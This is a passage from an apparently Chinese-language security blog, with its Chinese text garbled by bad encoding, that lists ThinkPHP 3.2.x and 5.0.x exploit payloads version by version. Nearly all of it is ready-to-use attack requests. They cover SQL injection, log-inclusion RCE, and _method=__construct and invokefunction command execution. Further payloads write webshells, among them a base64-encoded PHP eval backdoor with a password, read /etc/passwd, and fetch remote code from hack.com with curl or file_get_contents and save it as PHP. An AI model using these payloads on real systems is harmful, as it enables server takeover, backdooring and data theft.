class="regexp">/ThinkPHP/</span>POC</span><br></pre></td></tr></table></figure><p>order by æ³¨å…¥æ¼æ´</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?<span class="keyword">order</span>[updatexml(<span class="number">1</span>,concat(<span class="number">0x3a</span>,<span class="keyword">user</span>()),<span class="number">1</span>)]=<span class="number">1</span></span><br></pre></td></tr></table></figure><p>update æ³¨å…¥æ¼æ´</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">money</span>[]=<span class="number">1123</span>&amp;user=liao&amp;id[<span class="number">0</span>]=bind&amp;id[<span class="number">1</span>]=<span class="number">0</span>%<span class="number">20</span>and%<span class="number">20</span>(updatexml(<span class="number">1</span>,concat(<span class="number">0</span>x<span class="number">7</span>e,(select%<span class="number">20</span>user()),<span class="number">0</span>x<span class="number">7</span>e),<span class="number">1</span>))</span><br></pre></td></tr></table></figure><h3 id="3-2-x-RCE-æ¼æ´"><a href="#3-2-x-RCE-æ¼æ´" class="headerlink" title="3.2.x  RCE æ¼æ´"></a>3.2.x  RCE æ¼æ´</h3><p>å…³é—­ debug</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">GET</span> /index.php?m=--&gt;&lt;?=phpinfo();?&gt; HTTP/<span class="number">1</span>.<span class="number">1</span></span><br><span class="line"><span class="attribute">Host</span>: <span class="number">127.0.0.1</span></span><br><span class="line"><span class="attribute">User</span>-Agent: Mozilla/<span class="number">5</span>.<span class="number">0</span> (Macintosh; Intel Mac OS X <span class="number">10</span>_<span class="number">15</span>_<span class="number">6</span>) AppleWebKit/<span class="number">605</span>.<span class="number">1</span>.<span class="number">15</span> (KHTML, like Gecko) Version/<span class="number">13</span>.<span class="number">1</span>.<span class="number">2</span> Safari/<span class="number">605</span>.<span class="number">1</span>.<span class="number">15</span></span><br><span class="line"><span class="attribute">Accept</span>: text/html,application/xhtml+xml,application/xml;q=<span class="number">0</span>.<span class="number">9</span>,image/webp,*/*;q=<span class="number">0</span>.<span class="number">8</span></span><br><span class="line"><span class="attribute">Accept</span>-Language: en-GB,en;q=<span class="number">0</span>.<span class="number">5</span></span><br><span class="line"><span class="attribute">Accept</span>-Encoding: gzip, deflate</span><br><span class="line"><span class="attribute">Connection</span>: close</span><br><span class="line"><span class="attribute">Cookie</span>: PHPSESSID=b<span class="number">6</span>r<span class="number">46</span>ojgc<span class="number">9</span>tvdqpg<span class="number">9</span>efrao<span class="number">7</span>f<span class="number">66</span>;</span><br><span class="line"><span class="attribute">Upgrade</span>-Insecure-Requests: <span class="number">1</span></span><br></pre></td></tr></table></figure><p>è¯»å–æ—¥å¿—æ–‡ä»¶</p><figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">\A</span>pplication<span class="symbol">\R</span>untime<span class="symbol">\L</span>ogs<span class="symbol">\C</span>ommon<span class="symbol">\2</span>1_06_30.log</span><br></pre></td></tr></table></figure><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="link">http://127.0.0.1/index.php?m=Home&amp;c=Index&amp;a=index&amp;value</span>[<span class="string">_filename</span>]=./Application/Runtime/Logs/Common/21_06_30.log</span><br></pre></td></tr></table></figure><p>å¼€å¯debug</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">GET</span> /index.php?m=Home&amp;c=Index&amp;a=index&amp;test=--&gt;&lt;?=phpinfo();?&gt; HTTP/<span class="number">1</span>.<span class="number">1</span></span><br><span class="line"><span class="attribute">Host</span>: <span class="number">127.0.0.1</span></span><br><span class="line"><span class="attribute">User</span>-Agent: Mozilla/<span class="number">5</span>.<span class="number">0</span> (Macintosh; Intel Mac OS X <span class="number">10</span>_<span class="number">15</span>_<span class="number">6</span>) AppleWebKit/<span class="number">605</span>.<span class="number">1</span>.<span class="number">15</span> (KHTML, like Gecko) Version/<span class="number">13</span>.<span class="number">1</span>.<span class="number">2</span> Safari/<span class="number">605</span>.<span class="number">1</span>.<span class="number">15</span></span><br><span class="line"><span class="attribute">Accept</span>: text/html,application/xhtml+xml,application/xml;q=<span class="number">0</span>.<span class="number">9</span>,image/webp,*/*;q=<span class="number">0</span>.<span class="number">8</span></span><br><span class="line"><span class="attribute">Accept</span>-Language: en-GB,en;q=<span class="number">0</span>.<span class="number">5</span></span><br><span class="line"><span class="attribute">Accept</span>-Encoding: gzip, deflate</span><br><span class="line"><span class="attribute">Connection</span>: close</span><br><span class="line"><span class="attribute">Cookie</span>: PHPSESSID=b<span class="number">6</span>r<span class="number">46</span>ojgc<span class="number">9</span>tvdqpg<span class="number">9</span>efrao<span class="number">7</span>f<span class="number">66</span>;</span><br><span class="line"><span class="attribute">Upgrade</span>-Insecure-Requests: <span class="number">1</span></span><br></pre></td></tr></table></figure><p>æ–‡ä»¶é»˜è®¤è·¯å¾„</p><figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">\A</span>pplication<span class="symbol">\R</span>untime<span class="symbol">\L</span>ogs<span class="symbol">\H</span>ome<span class="symbol">\2</span>1_06_30.log</span><br></pre></td></tr></table></figure><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="link">http://127.0.0.1/index.php?m=Home&amp;c=Index&amp;a=index&amp;value</span>[<span class="string">_filename</span>]=./Application/Runtime/Logs/Home/21_06_30.log</span><br></pre></td></tr></table></figure><p>ä¼ å…¥æ¶æ„æ–‡ä»¶ï¼Œä¼ å…¥æ–‡ä»¶åœ°å€</p><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="link">http://127.0.0.1/index.php?m=Home&amp;c=Index&amp;a=index&amp;value</span>[<span class="string">_filename</span>]=./test.txt</span><br></pre></td></tr></table></figure><p>æœ€ç»ˆpayload</p><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="link">http://127.0.0.1/index.php?m=Home&amp;c=Index&amp;a=index&amp;info</span>[<span class="string">_filename</span>]=.\</span><br></pre></td></tr></table></figure><h2 id="ThinkPHP-5-x-æ¼æ´"><a href="#ThinkPHP-5-x-æ¼æ´" class="headerlink" title="ThinkPHP 5.x æ¼æ´"></a>ThinkPHP 5.x æ¼æ´</h2><p>tpæ¡†æ¶ç³»åˆ—ä¸­ï¼Œ5.0.x è·Ÿ 5.1.x ä¸­ï¼Œå„ä¸ªç³»åˆ—é‡Œçš„pocæ˜¯å‡ ä¹ä¸ºé€šç”¨çš„<br>5.0.1ä¸­æŸä¸ªpocåœ¨5.0.3ä¸­ä¹Ÿæ˜¯å¯ä»¥ç”¨çš„ï¼Œä¹Ÿå°±æ˜¯è¯´å½“æˆ‘ä»¬ç¢°åˆ°5.0.8çš„æ—¶å€™ï¼Œå¯ä»¥å°è¯•ç”¨5.0.1<br>æˆ– 5.0.5ç­‰ 5.0.x ç³»åˆ—çš„pocå»å°è¯•ä½¿ç”¨ï¼Œ5.1.x ç³»åˆ—åŒç†</p><p>æ¼æ´æˆå› </p><figure class="highlight vbscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">è·¯ç”±æ§åˆ¶ä¸ä¸¥è°¨ï¼Œé»˜è®¤ä¸å¼€å¯å¼ºåˆ¶è·¯ç”±ï¼Œä»è€Œå¯ä»¥ä»»æ„è°ƒç”¨Thinkphpçš„ç±»åº“</span><br><span class="line"></span><br><span class="line">ä¸»è¦æœ‰ä¸¤ç§æ–¹æ³•ï¼Œ</span><br><span class="line"></span><br><span class="line"><span class="number">1.</span><span class="built_in">Request</span>ä¸­çš„å˜é‡è¦†ç›–å¯¼è‡´RCE</span><br><span class="line"><span class="number">2.</span>è·¯ç”±æ§åˆ¶ä¸ä¸¥è°¨å¯¼è‡´çš„RCE</span><br></pre></td></tr></table></figure><h3 id="Thinkphp-5-0-1"><a href="#Thinkphp-5-0-1" class="headerlink" title="Thinkphp 5.0.1"></a>Thinkphp 5.0.1</h3><p>ï¼ˆ1ï¼‰åˆ¤æ–­æ˜¯å¦å­˜åœ¨æ¼æ´</p><p>poc1</p><pre><code>http://wwww.com/publics=phpinfo()&amp;_method=__construct&amp;filter=assert_method=__construct&amp;method=get&amp;filter[]=call_user_func&amp;server[]=phpinfo&amp;get[]=phpinfo_method=__construct&amp;method=get&amp;filter[]=call_user_func&amp;get[]=phpinfo_method=__construct&amp;method=get&amp;filter[]=call_user_func&amp;get[0]=phpinfo&amp;get[1]=1</code></pre><p>poc2</p><pre><code>http:/xxxx.com/?s=index/index/indexs=ipconfig&amp;_mehthod=__construct$method=&amp;filter[]=system</code></pre><p>ï¼ˆ2ï¼‰æ·±å…¥åˆ©ç”¨</p><p>ä½¿ç”¨postæäº¤</p><p>1ã€ä½¿ç”¨assertå‡½æ•°</p><pre><code>s=phpinfo()&amp;_method=__construct&amp;filter=assert</code></pre><p>2ã€includeå‡½æ•°ï¼Œå¯ä»¥æ ¹æ®æ­¤å‡½æ•°æŸ¥çœ‹ä¸€äº›æ–‡ä»¶åŠå…¶é…ç½®</p><pre><code>s=include(&quot;/etc/passwd&quot;)&amp;_method=__construct&amp;filter=assert</code></pre><p>3ã€file_put_contentså‡½æ•°ï¼Œå¯ä»¥ç›´æ¥å†™å…¥æ–‡ä»¶</p><pre><code>s=file_put_contents(&#39;/data/wwwroot/test.com/application/index/test.php&#39;,base64_decode(&#39;PD9waHAgJHBhc3M9JF9QT1NUWydhYWFhJ107ZXZhbCgkcGFzcyk7Pz4&#39;))&amp;_method=__construct&amp;filter=assert</code></pre><p>4ã€è¯»å–æ–‡ä»¶</p><pre><code>_method=__construct&amp;method=get&amp;filter[]=think\__include_file&amp;server[]=phpinfo&amp;get[]=../application/.htaccesss=include(&quot;../application/.htaccess&quot;)&amp;_method=__construct&amp;filter=assert//ps:å¦‚æœä¸åŠ .. è¯·åŠ ä¸Šå®Œæ•´è·¯å¾„</code></pre><p>5ã€var_dumpå‡½æ•°ï¼Œå¯ä»¥æŸ¥çœ‹è¯¥è·¯å¾„ä¸‹çš„æ–‡ä»¶ï¼Œæ–‡ä»¶å¤¹</p><pre><code>s=var_dump(scandir(&#39;../application/&#39;))&amp;_method=__construct&amp;filter=assert</code></pre><p>6ã€å¤åˆ¶æ–‡ä»¶</p><pre><code>s=copy(&quot;/data/wwwroot/data.tar&quot;, &quot;/data/wwwroot/test.com/public/data.tar&quot;)&amp;_method=__construct&amp;filter=asser</code></pre><h3 id="Thinkphp-5-0-2"><a href="#Thinkphp-5-0-2" class="headerlink" title="Thinkphp 5.0.2"></a>Thinkphp 5.0.2</h3><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">POST  /?s=<span class="keyword">index</span>/<span class="keyword">index</span></span><br><span class="line"></span><br><span class="line">s=whoami&amp;_method=__construct&amp;<span class="keyword">method</span>=POST&amp;<span class="keyword">filter</span>[]=<span class="keyword">system</span></span><br><span class="line"></span><br><span class="line">aaaa=whoami&amp;_method=__construct&amp;<span class="keyword">method</span>=<span class="keyword">GET</span>&amp;<span class="keyword">filter</span>[]=<span class="keyword">system</span></span><br><span class="line"></span><br><span class="line">_method=__construct&amp;<span class="keyword">method</span>=<span class="keyword">GET</span>&amp;<span class="keyword">filter</span>[]=<span class="keyword">system</span>&amp;<span class="keyword">get</span>[]=whoami</span><br></pre></td></tr></table></figure><p>getshell</p><figure class="highlight oxygene"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">POST  /?s=<span class="keyword">index</span>/<span class="keyword">index</span></span><br><span class="line"></span><br><span class="line">s=file_put_contents(<span class="string">&#x27;zerosec.php&#x27;</span>,<span class="string">&#x27;&lt;?php phpinfo();&#x27;</span>)&amp;_method=__construct&amp;<span class="function"><span class="keyword">method</span>=<span class="title">POST</span>&amp;<span class="title">filter</span>[]=<span class="title">assert</span></span></span><br></pre></td></tr></table></figure><h3 id="Thinkphp-5-0-3"><a href="#Thinkphp-5-0-3" class="headerlink" title="Thinkphp 5.0.3"></a>Thinkphp 5.0.3</h3><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">POST  /?s=<span class="keyword">index</span>/<span class="keyword">index</span></span><br><span class="line"></span><br><span class="line">s=whoami&amp;_method=__construct&amp;<span class="keyword">method</span>=POST&amp;<span class="keyword">filter</span>[]=<span class="keyword">system</span></span><br><span class="line"></span><br><span class="line">aaaa=whoami&amp;_method=__construct&amp;<span class="keyword">method</span>=<span class="keyword">GET</span>&amp;<span class="keyword">filter</span>[]=<span class="keyword">system</span></span><br><span class="line"></span><br><span class="line">_method=__construct&amp;<span class="keyword">method</span>=<span class="keyword">GET</span>&amp;<span class="keyword">filter</span>[]=<span class="keyword">system</span>&amp;<span class="keyword">get</span>[]=whoami</span><br></pre></td></tr></table></figure><p>getshell</p><figure class="highlight oxygene"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">POST  /?s=<span class="keyword">index</span>/<span class="keyword">index</span></span><br><span class="line"></span><br><span class="line">s=file_put_contents(<span class="string">&#x27;zerosec.php&#x27;</span>,<span class="string">&#x27;&lt;?php phpinfo();&#x27;</span>)&amp;_method=__construct&amp;<span class="function"><span class="keyword">method</span>=<span class="title">POST</span>&amp;<span class="title">filter</span>[]=<span class="title">assert</span></span></span><br></pre></td></tr></table></figure><h3 id="Thinkphp-5-0-4"><a href="#Thinkphp-5-0-4" class="headerlink" title="Thinkphp 5.0.4"></a>Thinkphp 5.0.4</h3><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">POST  /?s=<span class="keyword">index</span>/<span class="keyword">index</span></span><br><span class="line"></span><br><span class="line">s=whoami&amp;_method=__construct&amp;<span class="keyword">method</span>=POST&amp;<span class="keyword">filter</span>[]=<span class="keyword">system</span></span><br><span class="line"></span><br><span class="line">aaaa=whoami&amp;_method=__construct&amp;<span class="keyword">method</span>=<span class="keyword">GET</span>&amp;<span class="keyword">filter</span>[]=<span class="keyword">system</span></span><br><span class="line"></span><br><span class="line">_method=__construct&amp;<span class="keyword">method</span>=<span class="keyword">GET</span>&amp;<span class="keyword">filter</span>[]=<span class="keyword">system</span>&amp;<span class="keyword">get</span>[]=whoami</span><br></pre></td></tr></table></figure><p>getshell</p><figure class="highlight oxygene"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">POST</span><br><span class="line"></span><br><span class="line">s=file_put_contents(<span class="string">&#x27;zerosec.php&#x27;</span>,<span class="string">&#x27;&lt;?php phpinfo();&#x27;</span>)&amp;_method=__construct&amp;<span class="function"><span class="keyword">method</span>=<span class="title">POST</span>&amp;<span class="title">filter</span>[]=<span class="title">assert</span></span></span><br></pre></td></tr></table></figure><h3 id="Thinkphp-5-0-5"><a href="#Thinkphp-5-0-5" class="headerlink" title="Thinkphp 5.0.5"></a>Thinkphp 5.0.5</h3><p>wafå¯¹evalè¿›è¡Œäº†æ‹¦æˆª</p><p>ç¦æ­¢äº†assertå‡½æ•°å¯¹evalå‡½æ•°åé¢çš„æ‹¬å·è¿›è¡Œäº†æ­£åˆ™è¿‡æ»¤</p><p>å¯¹file_get_contentså‡½æ•°åé¢çš„æ‹¬å·è¿›è¡Œäº†æ­£åˆ™è¿‡æ»¤</p><figure class="highlight php-template"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="xml">http://test.com/?s=index/think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=file_put_contents&amp;vars[1][]=2.php&amp;vars[1][1]=</span><span class="php"><span class="meta">&lt;?php</span> <span class="comment">/*1111*/</span><span class="comment">/***/</span>file_put_contents<span class="comment">/*1**/</span>(<span class="comment">/***/</span><span class="string">&#x27;index11.php&#x27;</span><span class="comment">/**/</span>,file_get_contents(<span class="comment">/**/</span><span class="string">&#x27;https://www.hack.com/xxx.js&#x27;</span>))<span class="comment">/**/</span>;<span class="comment">/**/</span><span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure><h3 id="Thinkphp-5-0-6"><a href="#Thinkphp-5-0-6" class="headerlink" title="Thinkphp 5.0.6"></a>Thinkphp 5.0.6</h3><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">POST</span><br><span class="line"></span><br><span class="line">s=whoami&amp;_method=__construct&amp;<span class="keyword">method</span>=POST&amp;<span class="keyword">filter</span>[]=<span class="keyword">system</span></span><br><span class="line"></span><br><span class="line">aaaa=whoami&amp;_method=__construct&amp;<span class="keyword">method</span>=<span class="keyword">GET</span>&amp;<span class="keyword">filter</span>[]=<span class="keyword">system</span></span><br><span class="line"></span><br><span class="line">_method=__construct&amp;<span class="keyword">method</span>=<span class="keyword">GET</span>&amp;<span class="keyword">filter</span>[]=<span class="keyword">system</span>&amp;<span class="keyword">get</span>[]=whoami</span><br></pre></td></tr></table></figure><p>getshell</p><figure class="highlight oxygene"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">POST</span><br><span class="line"></span><br><span class="line">s=file_put_contents(<span class="string">&#x27;zerosec.php&#x27;</span>,<span class="string">&#x27;&lt;?php phpinfo();&#x27;</span>)&amp;_method=__construct&amp;<span class="function"><span class="keyword">method</span>=<span class="title">POST</span>&amp;<span class="title">filter</span>[]=<span class="title">assert</span></span></span><br></pre></td></tr></table></figure><h3 id="Thinkphp-5-0-7"><a href="#Thinkphp-5-0-7" class="headerlink" title="Thinkphp 5.0.7"></a>Thinkphp 5.0.7</h3><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">POST</span><br><span class="line"></span><br><span class="line">s=whoami&amp;_method=__construct&amp;<span class="keyword">method</span>=POST&amp;<span class="keyword">filter</span>[]=<span class="keyword">system</span></span><br><span class="line"></span><br><span class="line">aaaa=whoami&amp;_method=__construct&amp;<span class="keyword">method</span>=<span class="keyword">GET</span>&amp;<span class="keyword">filter</span>[]=<span class="keyword">system</span></span><br><span class="line"></span><br><span class="line">_method=__construct&amp;<span class="keyword">method</span>=<span class="keyword">GET</span>&amp;<span class="keyword">filter</span>[]=<span class="keyword">system</span>&amp;<span class="keyword">get</span>[]=whoami</span><br></pre></td></tr></table></figure><p>getshell</p><figure class="highlight oxygene"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">POST</span><br><span class="line"></span><br><span class="line">s=file_put_contents(<span class="string">&#x27;zerosec.php&#x27;</span>,<span class="string">&#x27;&lt;?php phpinfo();&#x27;</span>)&amp;_method=__construct&amp;<span class="function"><span class="keyword">method</span>=<span class="title">POST</span>&amp;<span class="title">filter</span>[]=<span class="title">assert</span></span></span><br></pre></td></tr></table></figure><h3 id="Thinkphp-5-0-8"><a href="#Thinkphp-5-0-8" class="headerlink" title="Thinkphp 5.0.8"></a>Thinkphp 5.0.8</h3><pre><code>http://test.com/public_method=__construct&amp;method=get&amp;filter[]=call_user_func&amp;server[]=phpinfo&amp;get[]=phpinfo_method=__construct&amp;method=get&amp;filter[]=call_user_func&amp;get[]=phpinfo_method=__construct&amp;method=get&amp;filter[]=call_user_func&amp;get[0]=phpinfo&amp;get[1]=1c=system&amp;f=calc&amp;_method=filter</code></pre><blockquote><p>å†™å…¥æ–‡ä»¶</p></blockquote><pre><code>http://wtest.com/index.php?s=index/think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=file_put_contents&amp;vars[1][]=uploads/1.php&amp;vars[1][]=&lt;?php ?&gt;</code></pre><blockquote><p>ç›´æ¥ç”¨èœåˆ€è¿</p></blockquote><pre><code>http://test.com/index.php?s=index/think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=assert&amp;vars[1][0]=eval($_POST[1])</code></pre><blockquote><p>getshell</p></blockquote><pre><code>POSTs=file_put_contents(&#39;zerosec.php&#39;,&#39;&lt;?php phpinfo();&#39;)&amp;_method=__construct&amp;method=POST&amp;filter[]=assert</code></pre><h3 id="Thinkphp-5-0-9"><a href="#Thinkphp-5-0-9" class="headerlink" title="Thinkphp 5.0.9"></a>Thinkphp 5.0.9</h3><blockquote><p>test.com/?s=index/index</p></blockquote><pre><code>POSTs=whoami&amp;_method=__construct&amp;method=POST&amp;filter[]=systemaaaa=whoami&amp;_method=__construct&amp;method=GET&amp;filter[]=system_method=__construct&amp;method=GET&amp;filter[]=system&amp;get[]=whoamic=system&amp;f=calc&amp;_method=filter</code></pre><blockquote><p>å†™shell</p></blockquote><pre><code>POSTs=file_put_contents(&#39;zerosec.php&#39;,&#39;&lt;?php phpinfo();&#39;)&amp;_method=__construct&amp;method=POST&amp;filter[]=asser</code></pre><h3 id="Thinkphp-5-0-10"><a href="#Thinkphp-5-0-10" class="headerlink" title="Thinkphp 5.0.10"></a>Thinkphp 5.0.10</h3><p>postæäº¤</p><pre><code>http://test.com/public/index.php?s=index/index/indexs=whoami&amp;_method=__construct&amp;method&amp;filter[]=syste</code></pre><h3 id="Thinkphp-5-0-11"><a href="#Thinkphp-5-0-11" class="headerlink" title="Thinkphp 5.0.11"></a>Thinkphp 5.0.11</h3><pre><code>http://test.com/?s=admin/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][0]=curl https://www.hack.com/xxx.js -o ./upload/xxx.ph</code></pre><h3 id="Thinkphp-5-0-12"><a href="#Thinkphp-5-0-12" class="headerlink" title="Thinkphp 5.0.12"></a>Thinkphp 5.0.12</h3><blockquote><p>test.com/?s=index/index</p></blockquote><pre><code>posts=whoami&amp;_method=__construct&amp;method=POST&amp;filter[]=systemaaaa=whoami&amp;_method=__construct&amp;method=GET&amp;filter[]=system_method=__construct&amp;method=GET&amp;filter[]=system&amp;get[]=whoamic=system&amp;f=calc&amp;_method=filter</code></pre><blockquote><p>å†™shell</p></blockquote><pre><code>POSTs=file_put_contents(&#39;zerosec.php&#39;,&#39;&lt;?php phpinfo();&#39;)&amp;_method=__construct&amp;method=POST&amp;filter[]=assert</code></pre><h3 id="Thinkphp-5-0-13"><a href="#Thinkphp-5-0-13" class="headerlink" title="Thinkphp 5.0.13"></a>Thinkphp 5.0.13</h3><blockquote><p>postæäº¤</p></blockquote><pre><code>test.com/?s=index/indexs=whoami&amp;_method=__construct&amp;method=POST&amp;filter[]=systemaaaa=whoami&amp;_method=__construct&amp;method=GET&amp;filter[]=system_method=__construct&amp;method=GET&amp;filter[]=system&amp;get[]=whoamic=system&amp;f=calc&amp;_method=filter</code></pre><blockquote><p>å†™shell</p></blockquote><pre><code>POSTs=file_put_contents(&#39;zerosec.php&#39;,&#39;&lt;?php phpinfo();&#39;)&amp;_method=__construct&amp;method=POST&amp;filter[]=assert</code></pre><p>è¡¥å……</p><blockquote><p>æœ‰captchaè·¯ç”±æ—¶æ— éœ€debug=true</p><p><a href="http://test.com/?s=captcha/calc">http://test.com/?s=captcha/calc</a></p></blockquote><pre><code>POST _method=__construct&amp;filter[]=system&amp;method=GET</code></pre><h3 id="Thinkphp-5-0-14"><a href="#Thinkphp-5-0-14" class="headerlink" title="Thinkphp 5.0.14"></a>Thinkphp 5.0.14</h3><p>1ã€å¸¸è§„å‘½ä»¤</p><pre><code>?s=index/think\app/invokefunction&amp;function=&amp;function=call_user_func_array&amp;vars[0]=file_put_contents&amp;vars[1][]=shell.php.jpg&amp;vars[1][]=%3C?php%20phpinfo();?3E</code></pre><p>2ã€evalï¼ˆ&#39;&#39;ï¼‰å’Œassertï¼ˆ&#39;&#39;ï¼‰è¢«æ‹¦æˆªï¼Œå‘½ä»¤å‡½æ•°è¢«ç¦æ­¢</p><pre><code>http://www.xxxx.com/?s=admin/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=assert&amp;vars[1][0]=phpinfo();http://www.xxx.com/?s=admin/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=assert&amp;vars[1][0]=eval($_GET[1])&amp;1=call_user_func_array(&quot;file_put_contents&quot;,array(&quot;3.php&quot;,file_get_contents(&quot;https://www.hack.com/xxx.js&quot;)));</code></pre><p>3ã€åŸºäºphp7.2ç¯å¢ƒä¸‹</p><pre><code>http://www.xxxx.cn/?s=admin/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=file_put_contents&amp;vars[1][0]=1.txt&amp;vars[1][1]=1http://www.xxxx.cn/?s=admin/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=file_put_contents&amp;vars[1][0]=index11.php&amp;vars[1][1]=&lt;?=file_put_contents(&#39;index111.php&#39;,file_get_contents(&#39;https://www.hack.com/xxx.js&#39;));?&gt;å†™è¿›å»å‘ç°è½¬ä¹‰äº†å°–æ‹¬å·</code></pre><p>4ã€é€šè¿‡copyå‡½æ•°</p><pre><code> http://www.xxxx.cn/?s=admin/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=copy&amp;vars[1][0]= https://www.hack.com/xxx.js&amp;vars[1][1]=112233.ph</code></pre><h3 id="Thinkphp-5-0-15"><a href="#Thinkphp-5-0-15" class="headerlink" title="Thinkphp 5.0.15"></a>Thinkphp 5.0.15</h3><blockquote><p><a href="https://test.com/?s=index/index">https://test.com/?s=index/index</a></p></blockquote><pre><code>posts=whoami&amp;_method=__construct&amp;method=POST&amp;filter[]=systemaaaa=whoami&amp;_method=__construct&amp;method=GET&amp;filter[]=system_method=__construct&amp;method=GET&amp;filter[]=system&amp;get[]=whoamic=system&amp;f=calc&amp;_method=filter</code></pre><blockquote><p>å†™shell</p></blockquote><pre><code>POSTs=file_put_contents(&#39;zerosec.php&#39;,&#39;&lt;?php phpinfo();&#39;)&amp;_method=__construct&amp;method=POST&amp;filter[]=assert</code></pre><blockquote><p>æœ‰captchaè·¯ç”±æ—¶æ— éœ€debug=true</p><p><a href="https://test.com/?s=captcha/calc">https://test.com/?s=captcha/calc</a></p></blockquote><pre><code>POST _method=__construct&amp;filter[]=system&amp;method=GET</code></pre><h3 id="Thinkphp-5-0-16"><a href="#Thinkphp-5-0-16" class="headerlink" title="Thinkphp 5.0.16"></a>Thinkphp 5.0.16</h3><blockquote><p><a href="https://test.com/?s=index/index">https://test.com/?s=index/index</a></p></blockquote><pre><code>posts=whoami&amp;_method=__construct&amp;method=POST&amp;filter[]=systemaaaa=whoami&amp;_method=__construct&amp;method=GET&amp;filter[]=system_method=__construct&amp;method=GET&amp;filter[]=system&amp;get[]=whoamic=system&amp;f=calc&amp;_method=filter</code></pre><blockquote><p>å†™shell</p></blockquote><pre><code>POSTs=file_put_contents(&#39;zerosec.php&#39;,&#39;&lt;?php phpinfo();&#39;)&amp;_method=__construct&amp;method=POST&amp;filter[]=assert</code></pre><blockquote><p>æœ‰captchaè·¯ç”±æ—¶æ— éœ€debug=true</p><p><a href="https://test.com/?s=captcha/calc">https://test.com/?s=captcha/calc</a></p></blockquote><pre><code>POST _method=__construct&amp;filter[]=system&amp;method=GET</code></pre><blockquote><p>å†™shell</p></blockquote><pre><code>posts=file_put_contents(&#39;/ç»å¯¹è·¯å¾„/test.php&#39;,base64_decode(&#39;PD9waHAgJHBhc3M9JF9QT1NUWydhYWFhJ107ZXZhbCgkcGFzcyk7Pz4&#39;))&amp;_method=__construct&amp;filter=assert    å¯†ç aaaa</code></pre><blockquote><p>ç›´æ¥èœåˆ€è¿</p></blockquote><pre><code>http://wtest.com/index.php?s=index/think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=assert&amp;vars[1][0]=eval($_POST[1])</code></pre><h3 id="Thinkphp-5-0-17"><a href="#Thinkphp-5-0-17" class="headerlink" title="Thinkphp 5.0.17"></a>Thinkphp 5.0.17</h3><blockquote><p><a href="https://test.com/?s=index/index">https://test.com/?s=index/index</a></p></blockquote><pre><code>POST 